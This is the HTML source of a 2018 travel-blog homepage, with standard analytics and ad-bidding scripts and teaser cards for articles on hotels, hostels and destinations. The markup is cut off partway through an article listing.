<!doctype html>
<html class="no-js" lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="UTF-8">
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="shortcut icon" type="image/png"
          href="http://pensandpatron.com/wp-content/themes/pap/favicon.png"/>


    <title>Pens &amp; Patron | Eat. Pen. Travel</title>

<!-- This site is optimized with the Yoast SEO plugin v3.4.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="Pens &amp; Patron is a travel site dedicated to wandering spirits. Explore, taste, and write about the world."/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="http://pensandpatron.com/" />
<link rel="next" href="http://pensandpatron.com/page/2/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="website" />
<meta property="og:title" content="Pens &amp; Patron | Eat. Pen. Travel" />
<meta property="og:description" content="Pens &amp; Patron is a travel site dedicated to wandering spirits. Explore, taste, and write about the world." />
<meta property="og:url" content="http://pensandpatron.com/" />
<meta property="og:site_name" content="Pens &amp; Patron" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="Pens &amp; Patron is a travel site dedicated to wandering spirits. Explore, taste, and write about the world." />
<meta name="twitter:title" content="Pens &amp; Patron | Eat. Pen. Travel" />
<script type='application/ld+json'>{"@context":"http:\/\/schema.org","@type":"WebSite","url":"http:\/\/pensandpatron.com\/","name":"Pens &amp; Patron","potentialAction":{"@type":"SearchAction","target":"http:\/\/pensandpatron.com\/?s={search_term_string}","query-input":"required name=search_term_string"}}</script>
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//s.w.org' />
<link rel='stylesheet' id='pap-style-main-css'  href='http://pensandpatron.com/wp-content/themes/pap/styles/main.css?ver=4.8.3' type='text/css' media='all' />
<script type='text/javascript' src='http://pensandpatron.com/wp-content/themes/pap/scripts/vendor.js?ver=4.8.3'></script>
<script type='text/javascript' src='http://pensandpatron.com/wp-content/themes/pap/scripts/vendor/modernizr.js?ver=4.8.3'></script>
<link rel='https://api.w.org/' href='http://pensandpatron.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://pensandpatron.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://pensandpatron.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 4.8.3" />
    <script>
      function storage(key, value) {
          var lsSupport = false;
          // Check for native support
          if (sessionStorage) {
              lsSupport = true;
          }
          // Value supplied, set new or modify store
          if (typeof value !== "undefined" && value !== null) {
              if (typeof value === 'object') {
                  value = JSON.stringify(value);
              }
              if (lsSupport) {
                  sessionStorage.setItem(key, value);
              } else {
                  createCookie(key, value, 30);
              }
          }
          // No value supplied, return value
          else if (typeof value === "undefined") {
              if (lsSupport) {
                  data = sessionStorage.getItem(key);
              } else {
                  data = readCookie(key);
              }
              return data;
          }
          // Null specified, remove store
          else if (value === null) {
              if (lsSupport) {
                  sessionStorage.removeItem(key);
              } else {
                  createCookie(key, '', -1);
              }
          }
          /**
           * Creates new cookie or removes cookie with negative expiration
           * @param  key       The key or identifier for the store
           * @param  value     Contents of the store
           * @param  exp       Expiration - creation defaults to 30 days
           */
          function createCookie(key, value, exp) {
              var date = new Date();
              date.setTime(date.getTime() + (exp * 24 * 60 * 60 * 1000));
              var expires = "; expires=" + date.toGMTString();
              document.cookie = key + "=" + value + expires + "; path=/";
          }
          /**
           * Returns contents of cookie
           * @param  key       The key or identifier for the store
           */
          function readCookie(key) {
              var nameEQ = key + "=";
              var ca = document.cookie.split(';');
              for (var i = 0, max = ca.length; i < max; i++) {
                  var c = ca[i];
                  while (c.charAt(0) === ' ') c = c.substring(1, c.length);
                  if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
              }
              return null;
          }
      }

      function getParameterByName(name) {
          name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
          var regex = new RegExp('[\\?&]' + name + '=([^&#]*)'),
              results = regex.exec(location.search);
          return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
      }

      function getUtmSource(){
          var STORAGE_SOURCE_KEY = 'cm_tracker_utm_source';
          var source = getParameterByName('utm_source');
          return source ? source : (storage(STORAGE_SOURCE_KEY) && storage(STORAGE_SOURCE_KEY) !== '' ? storage(STORAGE_SOURCE_KEY) : 'direct');
      }

      function getUtmCampaign(){
          var SOURCE_CAMPAIGN_KEY = 'cm_tracker_utm_campaign';
          var campaign = getParameterByName('utm_campaign');
          return campaign ? campaign : (storage(SOURCE_CAMPAIGN_KEY) && storage(SOURCE_CAMPAIGN_KEY) !== '' ? storage(SOURCE_CAMPAIGN_KEY) : 'direct');
      }

      function getUtmMedium(){
          var SOURCE_MEDIUM_KEY = 'cm_tracker_utm_medium';
          var medium = getParameterByName('utm_medium');
          return medium ? medium : (storage(SOURCE_MEDIUM_KEY) && storage(SOURCE_MEDIUM_KEY) !== '' ? storage(SOURCE_MEDIUM_KEY) : 'direct');
      }

      function getPageNumber(){
          var index = (document.location.pathname[document.location.pathname.length - 1] == '/')? 2 : 1;
          var number = Number(document.location.pathname.split('/')[document.location.pathname.split('/').length - index]);
          return number? number : 1;
      }
    </script>

    <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-99674762-1', 'auto');
  ga('send', 'pageview');

</script>

<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.9";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>

<!-- UNDERDOGMEDIA UTM Tracking Code Start -->
<script data-cfasync="false" language="javascript" async src="//bid.underdog.media/udm_tracker.js"></script>
<!-- UNDERDOGMEDIA UTM Tracking Code End -->

<!-- Begin comScore Tag -->
<script>
  var _comscore = _comscore || [];
  _comscore.push({ c1: "2", c2: "20535424" });
  (function() {
    var s = document.createElement("script"), el = document.getElementsByTagName("script")[0]; s.async = true;
    s.src = (document.location.protocol == "https:" ? "https://sb" : "http://b") + ".scorecardresearch.com/beacon.js";
    el.parentNode.insertBefore(s, el);
  })();
</script>
<noscript>
  <img src="http://b.scorecardresearch.com/p?c1=2&c2=20535424&cv=2.0&cj=1" />
</noscript>
<!-- End comScore Tag -->

<!-- Facebook Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window,document,'script',
'https://connect.facebook.net/en_US/fbevents.js');

 fbq('init', '560102780826976'); 
fbq('track', 'PageView');
</script>
<noscript>
 <img height="1" width="1" 
src="https://www.facebook.com/tr?id=560102780826976&ev=PageView
&noscript=1"/>
</noscript>
<!-- End Facebook Pixel Code -->

<script src="//dc8xl0ndzn2cb.cloudfront.net/js/pensandpatroncom/v0/keywee.min.js" type="text/javascript" async></script><script type='text/javascript'>var PREBID_TIMEOUT = 1600; var adUnits = eval(atob("W10="));var pbjs = pbjs || {}; pbjs.que = pbjs.que || []; pbjs.bidderSettings = {aol: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.8;}},sekindo: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.8;}},districtmDMX: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.85;}},brealtime: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.95;}},springserve: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.75;}},sharethrough: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.1;}},rubicon: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.3;}}};</script>
    <script type="text/javascript" src="//s.ntv.io/serve/load.js" async></script>
    
   <script type="text/javascript" src="//d1upt0rqzff34l.cloudfront.net/PAP/prebid.js" async></script>


  <script>
    var googletag = googletag || {};
    googletag.cmd = googletag.cmd || [];
    googletag.cmd.push(function() {
        googletag.pubads().disableInitialLoad();
        googletag.pubads().collapseEmptyDivs(true);
        googletag.pubads().setTargeting("pageNumber", String(getPageNumber()));
        googletag.pubads().setTargeting("utmSource", getUtmSource());
    });

    
            !function(a9,a,p,s,t,A,g){if(a[a9])return;function q(c,r){a[a9]._Q.push([c,r])}a[a9]={init:function(){q("i",arguments)},fetchBids:function(){q("f",arguments)},setDisplayBids:function(){},targetingKeys:function(){return[]},_Q:[]};A=p.createElement(s);A.async=!0;A.src=t;g=p.getElementsByTagName(s)[0];g.parentNode.insertBefore(A,g)}("apstag",window,document,"script","//c.amazon-adsystem.com/aax2/apstag.js");

            apstag.init({pubID: '97ffba2c-b3ce-4eed-a256-16877174179b', adServer: 'googletag'});

            apstag.fetchBids({
                slots: [
                    
                        {slotName: '/21612127490/pap-desktop-low', sizes: [[728, 90]], slotID: 'ad_pos_pap-desktop-low'},
                        {slotName: '/21612127490/pap-desktop-top', sizes: [[728, 90]], slotID: 'ad_pos_pap-desktop-top'},
                        {slotName: '/21612127490/pap-rr-atf', sizes: [[300, 250]], slotID: 'ad_pos_pap-rr-atf'},
                        {slotName: '/21612127490/pap-rr-btf', sizes: [[300, 250]], slotID: 'ad_pos_pap-rr-btf'},
                        {slotName: '/21612127490/pap-rr-mid', sizes: [[300, 600], [300, 250]], slotID: 'ad_pos_pap-rr-mid'},
                                        ],
                timeout: 2e3
            }, function(bids) {
                googletag.cmd.push(function(){
                    apstag.setDisplayBids();
                });
            });
        
    pbjs.que.push(function() {
        pbjs.setPriceGranularity({
            "buckets" : [{
                "precision": 2,
                "min" : 0,
                "max" : 3,
                "increment" : 0.01
            },
                {
                    "precision": 2,
                    "min" : 3,
                    "max" : 5,
                    "increment" : 0.05
                },
                {
                    "precision": 2,
                    "min" : 5,
                    "max" : 10,
                    "increment" : 0.1
                },
                {
                    "precision": 2,
                    "min" : 10,
                    "max" : 30,
                    "increment" : 0.5
                }]
        });
        pbjs.addAdUnits(adUnits);
        pbjs.requestBids({
            bidsBackHandler: sendAdserverRequest
        });
    });

	pbjs.que.push(function() {
	    pbjs.enableAnalytics({
	        provider: 'cmv2'
	    });
	});

    function sendAdserverRequest() {
        if (pbjs.adserverRequestSent) return;
        pbjs.adserverRequestSent = true;
        googletag.cmd.push(function() {
            pbjs.que.push(function() {
                pbjs.setTargetingForGPTAsync();
                googletag.pubads().refresh();
            });
        });
    }

    setTimeout(function() {
        sendAdserverRequest();
    }, PREBID_TIMEOUT);



  </script>

  <script>
    (function () {
        var gads = document.createElement('script');
        gads.async = true;
        gads.type = 'text/javascript';
        var useSSL = 'https:' == document.location.protocol;
        gads.src = (useSSL ? 'https:' : 'http:') +
                '//www.googletagservices.com/tag/js/gpt.js';
        var node = document.getElementsByTagName('script')[0];
        node.parentNode.insertBefore(gads, node);
    })();
  </script>

<script>
		googletag.cmd.push(function () {
		        //            googletag.defineSlot('/21612127490/pap-eof-top', [[468, 60], [728, 90], [300, 250]], 'ad_pos_pap-eof-top').addService(googletag.pubads());
            googletag.defineSlot('/21612127490/pap-desktop-low', [728, 90], 'ad_pos_pap-desktop-low').addService(googletag.pubads());
            googletag.defineSlot('/21612127490/pap-desktop-top', [728, 90], 'ad_pos_pap-desktop-top').addService(googletag.pubads());
            googletag.defineOutOfPageSlot('/21612127490/pap-edge', 'ad_pos_pap-edge').addService(googletag.pubads());
            googletag.defineSlot('/21612127490/pap-rr-atf', [300, 250], 'ad_pos_pap-rr-atf').addService(googletag.pubads());
            googletag.defineSlot('/21612127490/pap-rr-btf', [300, 250], 'ad_pos_pap-rr-btf').addService(googletag.pubads());
            googletag.defineSlot('/21612127490/pap-rr-mid', [[300, 600], [300, 250]], 'ad_pos_pap-rr-mid').addService(googletag.pubads());
			
        googletag.pubads().enableSingleRequest();
        googletag.enableServices();


    });
  </script>


</head>
<body class="home blog">
<script src="http://d1rlca3pqma1yp.cloudfront.net/minder-tracker.js"></script>
<!--[if lt IE 10]>
<p class="browserupgrade">You are using an <strong>outdated</strong> browser.
    Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve
    your experience.</p>
<![endif]-->
<header id="top_header">
<!--    -->    <nav class="navbar navbar-default navbar-fixed-top" id="top_nav">
	<div class="container">
		<div class="navbar-header">
			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar"
			        aria-expanded="false" aria-controls="navbar">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
			</button>
			<a class="navbar-brand" href="http://pensandpatron.com">
									<img src="http://pensandpatron.com/wp-content/themes/pap/images/logo.png" alt="Pens &amp; Patron" class="logo-image img-responsive">
							</a>
		</div>
		<div id="navbar" class="navbar-collapse collapse"><ul id="menu-header" class="nav navbar-nav"><li id="menu-item-808" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-808"><a title="Lifestyle" href="http://pensandpatron.com/category/lifestyle/">Lifestyle</a></li>
<li id="menu-item-809" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-809"><a title="Lists" href="http://pensandpatron.com/category/lists/">Lists</a></li>
<li id="menu-item-810" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-810"><a title="Locations" href="http://pensandpatron.com/category/locations/">Locations</a></li>
<li id="menu-item-811" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-811"><a title="Food" href="http://pensandpatron.com/category/food/">Food</a></li>
<li id="menu-item-812" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-812"><a title="Backpackers" href="http://pensandpatron.com/category/backpackers/">Backpackers</a></li>
<li id="menu-item-813" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-813"><a title="Editorial" href="http://pensandpatron.com/category/editorial/">Editorial</a></li>
</ul></div>		<!--/.navbar-collapse -->
	</div>
</nav></header>
<main id="main_content">

    <div id="banner">
    <div class="container">
        <div class="row">
            <div class="col-xs-12">
                <div class="banner_top_wrap">

                
<div class="top_block_big">
                                <article>
        <a href="http://pensandpatron.com/lifestyle/active-travel-companies/" class="wrapp_item">
            <div class="wrap_img_article">
                <div class="img_article" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/01/08134429/03fitness-trending2-jumbo.jpg')"></div>
            </div>
            <div class="item_text">
                <h2 class="header_item">Kick Start Your New Fitness Routine With These Active Travel Companies</h2>
                <p class="meta_post"><span class="meta_post_author">Meagan Nantwich</span> &bull; <span class="meta_post_date">Mar 20, 2018</span></p>
                <p class="meta_categoty">Lifestyle</p>
            </div>
        </a>
    </article>
    </div>


                <div class="top_block_right clearfix">
                <article>
        <a href="http://pensandpatron.com/locations/prisons-netherlands/" class="wrapp_item">
            <div class="wrap_img_article">
                <div class="img_article" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/02/06105022/Screen-Shot-2018-02-06-at-12.49.07-PM.png')"></div>
            </div>
            <div class="item_text">
                <h2 class="header_item">These Former Prisons In The Netherlands Are Turning Into Hotels</h2>
                <p class="meta_post"><span class="meta_post_author">Rachel Lewis</span> &bull; <span class="meta_post_date">Mar 18, 2018</span></p>
                <p class="meta_categoty">Locations</p>
            </div>
        </a>
    </article>
                    <article>
        <a href="http://pensandpatron.com/editorial/soaking-up-sun-benefits/" class="wrapp_item">
            <div class="wrap_img_article">
                <div class="img_article" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/03/08095848/beach-vacation-one-pager.jpg')"></div>
            </div>
            <div class="item_text">
                <h2 class="header_item">Soaking Up The Sun Can Provide You With Much More Than A Tan</h2>
                <p class="meta_post"><span class="meta_post_author">David Whittaker</span> &bull; <span class="meta_post_date">Mar 17, 2018</span></p>
                <p class="meta_categoty">Editorial</p>
            </div>
        </a>
    </article>
    </div>
                </div>
            </div>
        </div>
    </div>
</div>
    <div id="three_blocks">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-3">

                
<h2 class="title_block">Editor's Picks</h2>
<div class="three_blocks_item three_blocks_item_right">
							            <div class="tbcb_item">
                <a href="http://pensandpatron.com/locations/night-empire-state-building/">
                    <div class="tb_img_wrap">
                        <div class="tb_img" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/03/08142422/GettyImages-555173607-E.jpeg')"></div>
                    </div>
                    <p class="tbcb_item_meta">
                        <span class="tbcb_item_category">Locations</span>
                    </p>
                    <h2 class="tbcb_item_head">Here&#8217;s How You Can Spend A Night In The Empire State Building</h2>
                    <p class="meta_post"><span class="meta_post_author">Meagan Nantwich</span> &bull; <span class="meta_post_date">Mar 15, 2018</span></p>
                </a>
            </div>

									            <div class="tbcb_item">
                <a href="http://pensandpatron.com/editorial/couchsurfing-more-than-cheap-option/">
                    <div class="tb_img_wrap">
                        <div class="tb_img" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/01/09131254/couchsurfing-1.1496995.w740.jpg')"></div>
                    </div>
                    <p class="tbcb_item_meta">
                        <span class="tbcb_item_category">Editorial</span>
                    </p>
                    <h2 class="tbcb_item_head">Couchsurfing Is More Than Just A Cheap Option</h2>
                    <p class="meta_post"><span class="meta_post_author">Derek Ewing</span> &bull; <span class="meta_post_date">Mar 14, 2018</span></p>
                </a>
            </div>

			
    <hr class="tbcb_border visible-xs-block">

</div>
            </div>
            <div class="col-xs-12 col-sm-6 hidden-xs">

                
<h2 class="title_block">Top Stories</h2>
<div class="three_blocks_item three_blocks_item_center clearfix">
                <div class="tbcb_item">
        <a href="http://pensandpatron.com/backpackers/bald-eagles-vacation-canadian-river/">
            <div class="tb_img_wrap">
                <div class="tb_img" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/03/08153344/bald-eagle-brackendale-british-columbia-BCEAGLES0118.jpg')"></div>
            </div>
            <p class="tbcb_item_meta">
                <span class="tbcb_item_category">Backpackers</span>
            </p>
            <p class="meta_post"><span class="meta_post_author">Meagan Nantwich</span> &bull; <span class="meta_post_date">Mar 12, 2018</span></p>
            <h2 class="tbcb_item_head">Cozy Up To The Bald Eagles When You Vacation By This Canadian River</h2>
        </a>
    </div>
                <div class="tbcb_item">
        <a href="http://pensandpatron.com/editorial/hot-tubs-best-views/">
            <div class="tb_img_wrap">
                <div class="tb_img" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/03/08125515/hot-tubs.jpg')"></div>
            </div>
            <p class="tbcb_item_meta">
                <span class="tbcb_item_category">Editorial</span>
            </p>
            <p class="meta_post"><span class="meta_post_author">David Whittaker</span> &bull; <span class="meta_post_date">Mar 11, 2018</span></p>
            <h2 class="tbcb_item_head">The Hot Tubs With The Best Views In The World</h2>
        </a>
    </div>
                <div class="tbcb_item">
        <a href="http://pensandpatron.com/backpackers/puppy-island-getaway/">
            <div class="tb_img_wrap">
                <div class="tb_img" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/03/08105043/puppy-beach.jpg')"></div>
            </div>
            <p class="tbcb_item_meta">
                <span class="tbcb_item_category">Backpackers</span>
            </p>
            <p class="meta_post"><span class="meta_post_author">David Whittaker</span> &bull; <span class="meta_post_date">Mar 8, 2018</span></p>
            <h2 class="tbcb_item_head">Leave Your Next Vacation With An Adopted Puppy From This Island Getaway</h2>
        </a>
    </div>
    
    <div class="tbcb_item_single_center_post">

    
    <a href="http://pensandpatron.com/locations/vacation-like-stars-notebook/">
        <div class="row">
            <div class="col-md-4">
                <div class="wrap_meta_text">
                    <p class="tbcb_item_meta">
                        <span class="tbcb_item_category">Animals</span>
                    </p>
                    <h2 class="tbcb_item_head">Vacation Like The Stars Of The Notebook With This Charleston Hotel</h2>
                    <p class="meta_post"><span class="meta_post_author">Meagan Nantwich</span> &bull; <span class="meta_post_date">Mar 7, 2018</span></p>
                    <p class="tbcb_item_excerpt">
                        



Nicholas Spark's have written some of the most beloved romance novels in recent memory, many of which has been adapted for the screen. If you...                    </p>
                </div>

            </div>
            <div class="col-md-8">
                <div class="tb_img_wrap_single_center">
                    <div class="tb_img" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/02/08150616/25e94cf438d227324263da8ba67f22e3.jpg')"></div>
                </div>
            </div>
        </div>
    </a>

    
</div>

</div><!--three_blocks_item_post-->
            </div>
            <div class="col-xs-12 col-sm-3 hidden-xs">

                
<h2 class="title_block">Must Read</h2>
<div class="three_blocks_item three_blocks_item_right hiden-xs">
                <div class="tbcb_item">
        <a href="http://pensandpatron.com/lists/amazingly-luxurious-hotel-rooms/">
            <div class="tb_img_wrap">
                <div class="tb_img" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/03/01104054/luxury1-e1519900873197.jpg')"></div>
            </div>
            <p class="tbcb_item_meta">
                <span class="tbcb_item_category">Lists</span>
            </p>
            <h2 class="tbcb_item_head">You&#8217;ll Drool Over These Amazingly Luxurious Hotel Rooms</h2>
            <p class="meta_post"><span class="meta_post_author">Samantha Wells</span> &bull; <span class="meta_post_date">Mar 6, 2018</span></p>
        </a>
    </div>

                <div class="tbcb_item">
        <a href="http://pensandpatron.com/food/andrew-zimmern-one-bizarre-food/">
            <div class="tb_img_wrap">
                <div class="tb_img" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/02/05152902/11.jpg')"></div>
            </div>
            <p class="tbcb_item_meta">
                <span class="tbcb_item_category">Food</span>
            </p>
            <h2 class="tbcb_item_head">Andrew Zimmern Explains Why This Is The One &#8216;Bizarre Food&#8217; Everyone Needs To Try</h2>
            <p class="meta_post"><span class="meta_post_author">Rachel Lewis</span> &bull; <span class="meta_post_date">Mar 5, 2018</span></p>
        </a>
    </div>

    
    <hr class="tbcb_border visible-xs-block">

</div><!--three_blocks_item_center-->
            </div>
        </div>
    </div>
</div>
    <div id="banner_widget" class="hidden-xs hidden-sm">
    <div class="container">
        <div class="row">
            <div class="col-xs-8">
                <div class="wrap_ads_center">

                                            <div id="text-8" class="widget_text banner-widget-center"><div class="ads">			<div class="textwidget">
<div style="text-align:center;">
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- PAP D Floor WW (Dynamic) -->
<ins class="adsbygoogle"
     style="display:inline-block;width:728px;height:90px"
     data-ad-client="ca-pub-7353738824405897"
     data-ad-slot="3138377164"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
</div>
</div>
		</div></div>
                    
                </div>
            </div>
            <div class="col-xs-4">
                <div class="social_links_block">
                    <a href="https://www.facebook.com/pensandpatron/" target="_blank"><img src="http://pensandpatron.com/wp-content/themes/pap/images/img/facebook.png" class="img-responsive" alt=""></a>
                    <a href="https://twitter.com/PensAndPatron" target="_blank"><img src="http://pensandpatron.com/wp-content/themes/pap/images/img/twwe.png" class="img-responsive" alt=""></a>
<!--                    <a href="http://youtube.com"> <img src="--><!--/images/img/youtube.png" class="img-responsive" alt=""></a>-->
                </div>
            </div>
        </div>
    </div>
</div>
    <div class="container">
    <div class="row">
        <div class="col-xs-12">
            <div class="wrap_main_post_block">

                
<div class="main_content ">
    <h2 class="title_block"></h2>
                <article>
        <a href="http://pensandpatron.com/locations/destinations-five-continents/" class="wrapp_item clearfix">


                    <div class="wrap_img_article">
                        <div class="img_article" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/01/10113929/destinations-5.jpeg')"></div>
                    </div>


                    <div class="item_text">
                        <h2 class="header_item">These Destinations From Five Different Continents Will Give You Bang For Your Buck</h2>
                        <p class="meta_post"><span class="meta_post_author">JJ Foster</span> &bull; <span class="meta_post_date">Mar 3, 2018</span></p>
                        <p class="excerpt_item">



If you look carefully, you can just about go to any corner of the globe and find a destination where your dollar will go a long way. We have...</p>

                        <p class="read_more_post">Read more</p>
                    </div>


        </a>
        <div class="category_divider hidden-sm hidden-xs hidden-md" ></div>
    </article>

                <article>
        <a href="http://pensandpatron.com/backpackers/cheap-spring-break-ideas/" class="wrapp_item clearfix">


                    <div class="wrap_img_article">
                        <div class="img_article" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/02/01131449/glamping1.jpg')"></div>
                    </div>


                    <div class="item_text">
                        <h2 class="header_item">3 Cheap Spring Break Ideas That Won&#8217;t Break The Bank</h2>
                        <p class="meta_post"><span class="meta_post_author">Samantha Wells</span> &bull; <span class="meta_post_date">Mar 1, 2018</span></p>
                        <p class="excerpt_item">



Spring Break: everyone's favorite time of the year to let loose, have fun in the sun, and take the perfect pics to make everyone on your...</p>

                        <p class="read_more_post">Read more</p>
                    </div>


        </a>
        <div class="category_divider hidden-sm hidden-xs hidden-md" ></div>
    </article>

                <article>
        <a href="http://pensandpatron.com/locations/natural-lagoon-azores-island/" class="wrapp_item clearfix">


                    <div class="wrap_img_article">
                        <div class="img_article" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/02/22095749/Miradouro_da_Ponta_da_Ferraria_ou_Miradouro_da_Ilha_Sabrina_Ponta_da_Ferraria_Ginetes_Ponta_Delgada_ilha_de_Sa%CC%83o_Miguel_Ac%CC%A7ores.jpg')"></div>
                    </div>


                    <div class="item_text">
                        <h2 class="header_item">A Natural Lagoon On This Azores Island Should Be Your Next Spa Vacation</h2>
                        <p class="meta_post"><span class="meta_post_author">Meagan Nantwich</span> &bull; <span class="meta_post_date">Feb 27, 2018</span></p>
                        <p class="excerpt_item">



São Miguel, the biggest of the volcanic islands in the Azores chain, boasts a special feature that has attracted visitors to its shores for...</p>

                        <p class="read_more_post">Read more</p>
                    </div>


        </a>
        <div class="category_divider hidden-sm hidden-xs hidden-md" ></div>
    </article>

                <article>
        <a href="http://pensandpatron.com/backpackers/app-unsold-plane-tickets/" class="wrapp_item clearfix">


                    <div class="wrap_img_article">
                        <div class="img_article" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/02/22101640/last-minute-travel-planning-travel-app-LMTRAVAPPS0817.jpg')"></div>
                    </div>


                    <div class="item_text">
                        <h2 class="header_item">This App Lets Spontaneous Travelers Find Unsold Plane Tickets</h2>
                        <p class="meta_post"><span class="meta_post_author">Meagan Nantwich</span> &bull; <span class="meta_post_date">Feb 26, 2018</span></p>
                        <p class="excerpt_item">



For those spontaneous souls who prefer to book their travel on a whim or the procrastinators among us, there's a new start up catering to...</p>

                        <p class="read_more_post">Read more</p>
                    </div>


        </a>
        <div class="category_divider hidden-sm hidden-xs hidden-md" ></div>
    </article>

                <article>
        <a href="http://pensandpatron.com/backpackers/best-hostels-world/" class="wrapp_item clearfix">


                    <div class="wrap_img_article">
                        <div class="img_article" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/01/25131857/4880EAF100000578-5302317-image-a-25_1516724560277.jpg')"></div>
                    </div>


                    <div class="item_text">
                        <h2 class="header_item">The Very Best Hostels From Around The World</h2>
                        <p class="meta_post"><span class="meta_post_author">Charley Frank</span> &bull; <span class="meta_post_date">Feb 25, 2018</span></p>
                        <p class="excerpt_item">



When most people think of a hostel they think bunkbeds, shared showers with low hygiene standards and rowdy travelers running in and out of...</p>

                        <p class="read_more_post">Read more</p>
                    </div>


        </a>
        <div class="category_divider hidden-sm hidden-xs hidden-md" ></div>
    </article>

                <article>
        <a href="http://pensandpatron.com/editorial/taj-mahal-visitors-allowed/" class="wrapp_item clearfix">


                    <div class="wrap_img_article">
                        <div class="img_article" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/01/08092251/image-14.jpeg')"></div>
                    </div>


                    <div class="item_text">
                        <h2 class="header_item">Taj Mahal Has Begun Capping The Visitors Allowed Each Day</h2>
                        <p class="meta_post"><span class="meta_post_author">Meagan Nantwich</span> &bull; <span class="meta_post_date">Feb 24, 2018</span></p>
                        <p class="excerpt_item">



At the end of 2017, the Taj Mahal was the site of a dangerous stampede as visitors rushed to the exits shortly before closing time. In order...</p>

                        <p class="read_more_post">Read more</p>
                    </div>


        </a>
        <div class="category_divider hidden-sm hidden-xs hidden-md" ></div>
    </article>

                <article>
        <a href="http://pensandpatron.com/locations/honeymoon-destination-celebs/" class="wrapp_item clearfix">


                    <div class="wrap_img_article">
                        <div class="img_article" style="background-image: url('http://dz8z45gu0xcif.cloudfront.net/wp-content/uploads/2018/02/22130529/st-regis-borabora-aerial.jpg')"></div>
                    </div>


                    <div class="item_text">
                        <h2 class="header_item">This Is The Honeymoon Destination All The Celebs Are Flocking To</h2>
                        <p class="meta_post"><span class="meta_post_author">Charley Frank</span> &bull; <span class="meta_post_date">Feb 22, 2018</span></p>
                        <p class="excerpt_item">



It might not be the easiest of places to get to, but this hotel in Bora Bora is certainly worth traveling for, and there is a reason why all...</p>

                        <p class="read_more_post">Read more</p>
                    </div>


        </a>
        <div class="category_divider hidden-sm hidden-xs hidden-md" ></div>
    </article>

                <article>
        <a href="http://pensandpatron.com/lifestyle/five-bedroom-villa-mykonos/" class="wrapp_item clearfix">


                    <div class="wrap_img_article">
